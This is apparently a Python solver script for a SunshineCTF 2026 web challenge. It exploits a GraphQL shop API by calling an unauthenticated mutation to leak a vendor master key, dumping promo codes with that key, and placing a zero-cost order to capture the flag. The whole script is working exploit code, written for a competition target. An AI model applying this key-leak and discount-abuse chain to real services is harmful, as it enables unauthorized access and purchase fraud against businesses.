#!/usr/bin/env python3
"""
Used Goods of Tomorrow — SunshineCTF 2026 (web, 500 pts) — solver

Chain:
  1. register a FutureBank account (500 starter credits)
  2. call unauthenticated vendorTerminalSync -> leaks VND-MASTER key
  3. promoCodes(vendorKey=<leaked>) -> dumps FOUNDERS-100 (100% off Lot #4042)
  4. placeOrder(4042, FOUNDERS-100) -> flag

Usage: python3 solver.py [base_url]
Deps:  requests
"""

import re
import sys
import uuid

import requests

BASE = (sys.argv[1] if len(sys.argv) > 1
        else "https://usedgoods.web.2026.sunshinectf.games").rstrip("/")
FLAG_RE = re.compile(r"sun\{[^}\s]+\}")

GQL = lambda s, q, v=None: s.post(
    f"{BASE}/graphql", json={"query": q, "variables": v or {}}, timeout=60).json()


def register(s):
    u = "buyer_" + uuid.uuid4().hex[:8]
    r = GQL(s, "mutation($u:String!,$p:String!){register(username:$u,password:$p){token}}",
            {"u": u, "p": uuid.uuid4().hex})
    tok = r["data"]["register"]["token"]
    s.headers["Authorization"] = "Bearer " + tok
    print(f"[+] registered {u}")


def leak_vendor_key(s):
    q = ('mutation($t:ID){vendorTerminalSync(terminalId:$t)'
         '{terminalId status firmware vendorKey note}}')
    r = GQL(s, q, {"t": "anything"})["data"]["vendorTerminalSync"]
    print(f"[+] terminal {r['terminalId']}: {r['note']}")
    key = r["vendorKey"]
    assert key.startswith("VND-MASTER-"), f"unexpected vendorKey: {key}"
    return key


def dump_promos(s, key):
    q = '{promoCodes(vendorKey:"%s"){code description percentOff appliesTo}}' % key
    promos = GQL(s, q)["data"]["promoCodes"]
    for p in promos:
        print(f"    {p['code']:<14} {p['percentOff']:>3}% off  listing={p['appliesTo']}")
    code = next(p["code"] for p in promos
                if p["appliesTo"] == "4042" and p["percentOff"] >= 100)
    print(f"[+] found full-discount code for Lot #4042: {code}")
    return code


def buy_vault(s, code):
    q = ('mutation($p:String){placeOrder(listingId:"4042",promoCode:$p)'
         '{success message pricePaid flag}}')
    r = GQL(s, q, {"p": code})["data"]["placeOrder"]
    print(f"[+] {r['message']}")
    assert r["success"] and r["pricePaid"] == 0
    flag = r["flag"]
    assert FLAG_RE.fullmatch(flag), flag
    print(f"[+] FLAG: {flag}")
    return flag


def main():
    s = requests.Session()
    register(s)
    key = leak_vendor_key(s)
    code = dump_promos(s, key)
    buy_vault(s, code)


if __name__ == "__main__":
    main()
